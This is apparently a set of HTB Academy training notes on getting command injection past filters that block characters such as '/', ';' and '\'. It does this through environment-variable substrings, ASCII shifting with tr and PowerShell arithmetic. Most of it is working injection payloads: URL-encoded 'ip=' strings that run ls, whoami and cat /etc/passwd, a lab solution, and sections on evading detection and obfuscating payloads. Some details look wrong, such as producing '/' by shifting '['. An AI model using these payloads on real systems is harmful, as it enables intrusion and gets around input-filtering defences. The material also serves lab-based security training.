# Bypassing Other Blacklisted Characters

> **🔀 Character Crafting:** Advanced techniques for generating blacklisted characters using environment variables and character manipulation

## Overview

Beyond injection operators and space characters, many other characters are commonly blacklisted in command injection filters. The most frequently blocked characters include:

- **Forward slash (`/`)** - Essential for Linux/Unix directory paths
- **Backslash (`\`)** - Required for Windows directory paths  
- **Semicolon (`;`)** - Common command separator
- **Special characters** - Various symbols used in advanced payloads

This section demonstrates sophisticated techniques to generate any required character while avoiding direct use of blacklisted characters.

**Focus:** Creative character generation methods for comprehensive filter bypass.

---

## Linux Environment Variable Extraction

### Understanding Environment Variables

**Concept:** Linux environment variables contain various characters that can be extracted using substring operations.

**Syntax:** `${VARIABLE:start:length}`
- **start** - Starting position (0-indexed)
- **length** - Number of characters to extract

### Extracting Forward Slash (/)

**Using $PATH Variable:**
```bash
# View PATH contents
kabaneridev@htb[/htb]$ echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games

# Extract first character (forward slash)
kabaneridev@htb[/htb]$ echo ${PATH:0:1}
/
```

**Analysis:**
- `${PATH}` starts with `/usr/local/bin...`
- `${PATH:0:1}` extracts position 0, length 1 = `/`

**Web Application Usage:**
```http
# Original blocked payload: 127.0.0.1%0als%20/home
# Environment variable bypass: 127.0.0.1%0als${PATH:0:1}home
ip=127.0.0.1%0als${PATH:0:1}home
```

**Alternative Environment Variables:**
```bash
# Using $HOME
echo ${HOME:0:1}        # → /

# Using $PWD  
echo ${PWD:0:1}         # → /

# Using any absolute path variable
echo ${SHELL:0:1}       # → / (if SHELL=/bin/bash)
```

### Extracting Semicolon (;)

**Using $LS_COLORS Variable:**
```bash
# View LS_COLORS contents (truncated example)
kabaneridev@htb[/htb]$ echo ${LS_COLORS}
rs=0:di=01;34:ln=01;36:mh=00...

# Extract semicolon at position 10
kabaneridev@htb[/htb]$ echo ${LS_COLORS:10:1}
;
```

**Understanding the Extraction:**
```bash
# LS_COLORS structure: rs=0:di=01;34:ln=01;36...
# Position:            0123456789...
#                               ^
#                         Position 10 = ;
```

**Web Application Usage:**
```http
# Using semicolon + space for injection
ip=127.0.0.1${LS_COLORS:10:1}${IFS}whoami
# URL encoded: ip=127.0.0.1%24%7bLS_COLORS:10:1%7d%24%7bIFS%7dwhoami
```

### Environment Variable Discovery

**Finding Useful Variables:**
```bash
# List all environment variables
printenv

# Search for variables containing specific characters
printenv | grep ";"
printenv | grep "/"
printenv | grep "&"
printenv | grep "|"
```

**Common Variables with Useful Characters:**
```bash
PATH=/usr/local/bin:/usr/bin         # Contains /
LS_COLORS=rs=0:di=01;34             # Contains ;
PS1='$ '                            # Contains various symbols
TERM=xterm-256color                 # Contains -
```

### Variable Syntax Alternatives

**Different Environment Variable Formats:**
```bash
# Explicit form (recommended - safer)
${IFS}        # Clear variable boundaries
${PATH:0:1}   # Substring with explicit braces

# Short form (compact)
$IFS          # Direct variable reference
$PATH         # Basic variable access

# Quoted variations
"${IFS}"      # Double quoted (allows expansion)
'${IFS}'      # Single quoted (literal string)
"$IFS"        # Double quoted short form
```

**Web Application Usage Variations:**
```http
# Method A: Explicit syntax (recommended)
ip=127.0.0.1%0als${IFS}${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24%7bIFS%7d%24%7bPATH:0:1%7dhome

# Method B: Short syntax (compact)
ip=127.0.0.1%0als$IFS${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24IFS%24%7bPATH:0:1%7dhome

# Method C: Mixed syntax
ip=127.0.0.1%0als$IFS$PATH%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f
# URL encoded: ip=127.0.0.1%0als%24IFS%24PATH (with manual slashes)
```

**Advantages of Each Syntax:**

**Explicit `${VAR}` Syntax:**
- ✅ **Clear boundaries** - Prevents variable name confusion
- ✅ **Safer parsing** - Bash interprets correctly in complex contexts
- ✅ **Substring support** - Required for `${VAR:start:length}`
- ✅ **Best practice** - Recommended in professional scripts

**Short `$VAR` Syntax:**
- ✅ **Compact** - Shorter payloads
- ✅ **Less encoding** - Fewer special characters to URL encode
- ✅ **Faster typing** - Quick manual testing
- ❌ **Ambiguous boundaries** - Can cause parsing issues in complex strings

### URL Encoding Comparison

**Encoding Length Differences:**
```bash
# Original command: ls /home
# Method A: ${IFS}${PATH:0:1}
Raw:     ls${IFS}${PATH:0:1}home
Encoded: ls%24%7bIFS%7d%24%7bPATH:0:1%7dhome
Length:  38 characters

# Method B: $IFS${PATH:0:1}  
Raw:     ls$IFS${PATH:0:1}home
Encoded: ls%24IFS%24%7bPATH:0:1%7dhome
Length:  32 characters (6 chars shorter)

# Method C: Short variables only
Raw:     ls$IFS$HOME
Encoded: ls%24IFS%24HOME  
Length:  15 characters (23 chars shorter)
```

**Practical Payload Size Impact:**
```http
# Long payload (explicit syntax): 127.0.0.1%0als%24%7bIFS%7d%24%7bPATH:0:1%7dhome
# Size: 49 characters

# Medium payload (mixed syntax): 127.0.0.1%0als%24IFS%24%7bPATH:0:1%7dhome  
# Size: 43 characters (6 chars saved)

# Short payload (when possible): 127.0.0.1%0als%24IFS%24HOME
# Size: 30 characters (19 chars saved)
```

### Advanced Character Extraction

**Extracting Multiple Characters:**
```bash
# Extract "/bin" from PATH
echo ${PATH:0:4}        # → /usr
echo ${PATH:5:8}        # → local/bi

# Extract specific patterns
echo ${PATH:10:4}       # → /usr (from different position)
```

**Dynamic Position Calculation:**
```bash
# Finding semicolon in LS_COLORS dynamically
var=${LS_COLORS}
pos=10
echo ${var:$pos:1}      # → ;
```

---

## Windows Character Extraction

### Windows Command Line (CMD)

**Understanding Windows Substring Syntax:**
`%VARIABLE:~start,length%` or `%VARIABLE:~start,end%`

**Extracting Backslash (\):**
```cmd
# View HOMEPATH contents
C:\htb> echo %HOMEPATH%
\Users\htb-student

# Extract backslash using position and negative length
C:\htb> echo %HOMEPATH:~6,-11%
\
```

**Breaking Down the Extraction:**
```
HOMEPATH = \Users\htb-student
Positions:  0123456789...
           \Users\htb-student
                ^     ^
           Start=6   -11 from end
Result: Single \ character
```

**Alternative Windows Variables:**
```cmd
# Using WINDIR
echo %WINDIR:~2,1%      # → \ (from C:\Windows)

# Using PROGRAMFILES
echo %PROGRAMFILES:~2,1% # → \ (from C:\Program Files)
```

### Windows PowerShell

**Array-Based Character Access:**
```powershell
# PowerShell treats strings as character arrays
PS C:\htb> $env:HOMEPATH[0]
\

# Alternative variables
PS C:\htb> $env:WINDIR[2]
\

# Accessing other characters
PS C:\htb> $env:PROGRAMFILES[10]
# (depends on the value of PROGRAMFILES)
```

**Environment Variable Discovery:**
```powershell
# List all environment variables
Get-ChildItem Env:

# Search for specific characters
Get-ChildItem Env: | Where-Object {$_.Value -like "*;*"}
Get-ChildItem Env: | Where-Object {$_.Value -like "*\*"}
```

**Complex Character Extraction:**
```powershell
# Extract from longer variables
$env:PATH.Split(';')[0][2]    # Get specific character from path segment
($env:PSModulePath -split ';')[0][10]  # Extract from module paths
```

---

## Character Shifting Techniques

### Linux Character Shifting

**Understanding ASCII Shifting:**
- Each character has an ASCII value
- We can shift characters by 1 position to get adjacent characters
- Useful when the exact character is blocked but adjacent ones aren't

**Basic Shifting Command:**
```bash
# tr command shifts character range
echo $(tr '!-}' '"-~'<<<[)
# Result: \
```

**How It Works:**
```bash
# ASCII values:
# [ = 91 (decimal)
# \ = 92 (decimal)

# tr '!-}' '"-~' shifts each character by +1
# So [ (91) becomes \ (92)
```

**Finding Characters for Shifting:**
```bash
# Check ASCII table
man ascii

# Find character before semicolon
# ; = 59 (decimal) = 073 (octal)
# : = 58 (decimal) = 072 (octal)

# Generate semicolon
echo $(tr '!-}' '"-~'<<<:)
# Result: ;
```

### Practical ASCII Reference

**Common Characters and Their Predecessors:**
```bash
# Target → Predecessor → Shift Command
;  (59)  →  :  (58)   → echo $(tr '!-}' '"-~'<<<:)
\  (92)  →  [  (91)   → echo $(tr '!-}' '"-~'<<<[)
|  (124) →  {  (123)  → echo $(tr '!-}' '"-~'<<<{)
&  (38)  →  %  (37)   → echo $(tr '!-}' '"-~'<<<%)
```

**Web Application Usage:**
```http
# Using shifted semicolon
ip=127.0.0.1$(tr '!-}' '"-~'<<<:) whoami

# Combining with other techniques
ip=127.0.0.1$(tr '!-}' '"-~'<<<:)${IFS}whoami
```

### Windows Character Shifting

**PowerShell Shifting:**
```powershell
# Convert character to ASCII and add 1
[char]([int][char]':' + 1)    # → ;
[char]([int][char]'[' + 1)    # → \
[char]([int][char]'{' + 1)    # → |
```

**CMD Character Arithmetic:**
```cmd
# More complex in CMD, typically requires FOR loops
# Generally prefer environment variable extraction
```

---

## HTB Academy Lab Solution

### Challenge Requirements

**Task:** Find the name of the user in the '/home' folder.

**Constraints:**
- Forward slash (/) likely blacklisted
- Need to execute `ls /home` or similar command
- Must use character bypass techniques

### Solution Approaches

**Method 1: Environment Variable for Slash**
```http
ip=127.0.0.1%0als${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24%7bPATH:0:1%7dhome
```

**Method 2: Brace Expansion + Environment Variable**
```http
ip=127.0.0.1%0a{ls,${PATH:0:1}home}
# URL encoded: ip=127.0.0.1%0a%7bls,%24%7bPATH:0:1%7dhome%7d
```

**Method 3: IFS + Environment Variable**
```http
ip=127.0.0.1%0als${IFS}${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24%7bIFS%7d%24%7bPATH:0:1%7dhome
```

**Method 4: Character Shifting for Slash**
```http
ip=127.0.0.1%0als$(tr '!-}' '"-~'<<<[)home
# Using ASCII shift to generate /
```

**Method 5: Short Syntax Alternative**
```http
ip=127.0.0.1%0als$IFS${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24IFS%24%7bPATH:0:1%7dhome
# Uses compact $IFS instead of ${IFS}
```

### Expected Output Analysis

**Command Execution:**
```bash
# ls /home equivalent
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

htb-student
```

**Alternative Possible Usernames:**
- `htb-student`
- `ubuntu`
- `user`
- `kali`
- `pentester`

**Answer:** Based on typical HTB Academy naming: `htb-student`

---

## Advanced Character Generation

### Comprehensive Character Mapping

**Environment Variable Character Sources:**
```bash
# Slash (/)
${PATH:0:1}        → /
${HOME:0:1}        → /
${PWD:0:1}         → /

# Colon (:)
${PATH:4:1}        → : (from /usr:local)
${LS_COLORS:2:1}   → : (from rs=0:di)

# Equals (=)
${LS_COLORS:1:1}   → = (from rs=0)
${PATH:5:1}        → = (varies by PATH)

# Dash (-)
${LS_COLORS:7:1}   → - (from di=01-34)
${BASH_VERSION:4:1} → - (from 5.1-6)
```

### Multi-Character Generation

**Building Complex Strings:**
```bash
# Combining multiple extractions
${PATH:0:1}etc${PATH:0:1}passwd    # → /etc/passwd
${PATH:0:1}bin${PATH:0:1}bash      # → /bin/bash
${PATH:0:1}tmp${PATH:0:1}test      # → /tmp/test
```

**Variable Concatenation:**
```bash
# Creating paths dynamically
path=${PATH:0:1}home${PATH:0:1}user
ls $path    # → ls /home/user
```

### Platform-Agnostic Approaches

**Cross-Platform Character Generation:**
```bash
# Linux
slash=${PATH:0:1}

# Windows CMD  
set "slash=%PROGRAMFILES:~2,1%"

# Windows PowerShell
$slash = $env:WINDIR[2]
```

---

## Detection Evasion Strategies

### Randomizing Character Sources

**Varying Environment Variables:**
```bash
# Don't always use the same variable
Method 1: ${PATH:0:1}
Method 2: ${HOME:0:1}  
Method 3: ${PWD:0:1}
Method 4: ${SHELL:0:1}
```

**Dynamic Position Selection:**
```bash
# Use different positions when possible
${LS_COLORS:10:1}   # Position 10
${LS_COLORS:15:1}   # Position 15 (if it contains ;)
${PS1:1:1}          # Alternative position
```

### Obfuscation Techniques

**Multi-Layer Character Generation:**
```bash
# Combine techniques
var=${PATH:0:1}tmp
$(tr '!-}' '"-~'<<<:) # Shifted semicolon
{ls,${var}}           # Brace expansion
```

**Payload Fragmentation:**
```bash
# Split payloads across multiple variables
p1=${PATH:0:1}
p2=home
ls ${p1}${p2}
```

---

## Comprehensive Testing Methodology

### Character Discovery Process

**Step 1: Environment Enumeration**
```bash
# List all environment variables
printenv | head -20

# Search for target characters
printenv | grep "/" | head -5
printenv | grep ";" | head -5
printenv | grep "&" | head -5
```

**Step 2: Position Mapping**
```bash
# Map character positions in promising variables
echo "${PATH}" | sed 's/./&\n/g' | nl    # Number each character
echo "${LS_COLORS}" | sed 's/./&\n/g' | nl
```

**Step 3: Extraction Testing**
```bash
# Test extractions locally
echo ${PATH:0:1}     # Test position 0
echo ${PATH:1:1}     # Test position 1
echo ${PATH:4:1}     # Test position 4
```

**Step 4: Web Application Testing**
```http
# Test in target application - Explicit syntax
ip=127.0.0.1%0aecho${IFS}${PATH:0:1}
ip=127.0.0.1%0als${PATH:0:1}home

# Test alternative syntax variations
ip=127.0.0.1%0aecho$IFS${PATH:0:1}         # Short IFS syntax
ip=127.0.0.1%0als$IFS${PATH:0:1}home       # Mixed syntax
ip=127.0.0.1%0aecho"${IFS}"${PATH:0:1}     # Quoted syntax
```

### Payload Development Template

**Progressive Character Bypass:**
```bash
# Level 1: Simple character replacement
original: ls /home
bypass:   ls${PATH:0:1}home

# Level 2: Multiple character bypass  
original: ls /home; whoami
bypass:   ls${PATH:0:1}home${LS_COLORS:10:1}${IFS}whoami

# Level 3: Complex string construction
original: cat /etc/passwd
bypass:   cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Level 4: Full command obfuscation
original: find /home -name "*.txt"
bypass:   {find,${PATH:0:1}home,-name,${PATH:0:1}*.txt}
```

This comprehensive guide to character filter bypasses enables sophisticated payload construction while evading detection, ensuring successful command injection even when multiple character classes are blacklisted. 